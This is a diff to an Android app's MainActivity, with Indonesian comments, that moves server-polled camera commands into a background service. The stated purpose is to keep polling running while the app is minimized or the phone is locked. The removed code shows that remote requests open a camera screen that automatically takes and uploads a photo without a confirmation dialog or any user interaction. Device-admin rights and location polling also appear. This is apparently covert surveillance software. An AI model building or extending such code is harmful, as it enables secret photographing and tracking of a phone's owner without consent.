@@ -27,18 +27,6 @@ public class MainActivity
     private static final int DEVICE_ADMIN_CODE = 101;
 
     private static final long
-            CAMERA_POLL_INTERVAL_MS = 10000L;
-
-    private final Handler
-            cameraCommandHandler =
-            new Handler(
-                    Looper.getMainLooper()
-            );
-
-    private boolean cameraPollingStarted =
-            false;
-
-    private static final long
             LOCATION_POLL_INTERVAL_MS = 10000L;
 
     private final Handler
@@ -182,141 +170,10 @@ public class MainActivity
                                 )
         );
 
-        startCameraCommandPolling();
+        // Polling kamera dipindahkan ke CameraPollingService supaya
+        // tetap jalan meski app di-minimize atau HP dikunci.
+        CameraPollingService.start(this);
         startLocationCommandPolling();
-    }
-
-    private void startCameraCommandPolling() {
-
-        if (cameraPollingStarted) {
-            return;
-        }
-
-        cameraPollingStarted = true;
-
-        cameraCommandHandler.post(
-                new Runnable() {
-
-                    @Override
-                    public void run() {
-
-                        checkCameraCommand();
-
-                        cameraCommandHandler
-                                .postDelayed(
-                                        this,
-                                        CAMERA_POLL_INTERVAL_MS
-                                );
-                    }
-                }
-        );
-    }
-
-    private void checkCameraCommand() {
-
-        new Thread(
-                () -> {
-
-                    JSONObject result =
-                            ApiHelper
-                                    .getPendingCameraRequest();
-
-                    if (result == null) {
-                        return;
-                    }
-
-                    if (!"success"
-                            .equalsIgnoreCase(
-                                    result.optString(
-                                            "status",
-                                            ""
-                                    )
-                            )) {
-
-                        return;
-                    }
-
-                    JSONObject request =
-                            result.optJSONObject(
-                                    "request"
-                            );
-
-                    if (request == null) {
-                        return;
-                    }
-
-                    String requestId =
-                            request.optString(
-                                    "id",
-                                    ""
-                            );
-
-                    String camera =
-                            request.optString(
-                                    "camera",
-                                    ""
-                            );
-
-                    if (requestId.isEmpty()) {
-                        return;
-                    }
-
-                    if (!"front".equals(camera)
-                            &&
-                            !"back".equals(camera)) {
-
-                        return;
-                    }
-
-                    runOnUiThread(
-                            () ->
-                                    showCameraConfirmation(
-                                            requestId,
-                                            camera
-                                    )
-                    );
-                }
-        ).start();
-    }
-
-    private void showCameraConfirmation(
-            String requestId,
-            String camera
-    ) {
-
-        if (isFinishing()) {
-            return;
-        }
-
-        // Langsung tandai RECEIVED dan buka CameraActivity tanpa dialog.
-        // CameraActivity akan otomatis mengambil foto dan upload —
-        // tidak ada interaksi manual dari pengguna yang diperlukan.
-        new Thread(
-                () ->
-                        ApiHelper
-                                .updateCameraRequestStatus(
-                                        requestId,
-                                        "RECEIVED"
-                                )
-        ).start();
-
-        Intent intent =
-                new Intent(
-                        MainActivity.this,
-                        CameraActivity.class
-                );
-
-        intent.putExtra(
-                "requestId",
-                requestId
-        );
-
-        intent.putExtra(
-                "camera",
-                camera
-        );
-
-        startActivity(intent);
     }
 
     private void startLocationCommandPolling() {
@@ -390,17 +247,11 @@ public class MainActivity
     @Override
     protected void onDestroy() {
 
-        cameraCommandHandler
-                .removeCallbacksAndMessages(
-                        null
-                );
-
         locationCommandHandler
                 .removeCallbacksAndMessages(
                         null
                 );
 
-        cameraPollingStarted = false;
         locationPollingStarted = false;
 
         super.onDestroy();
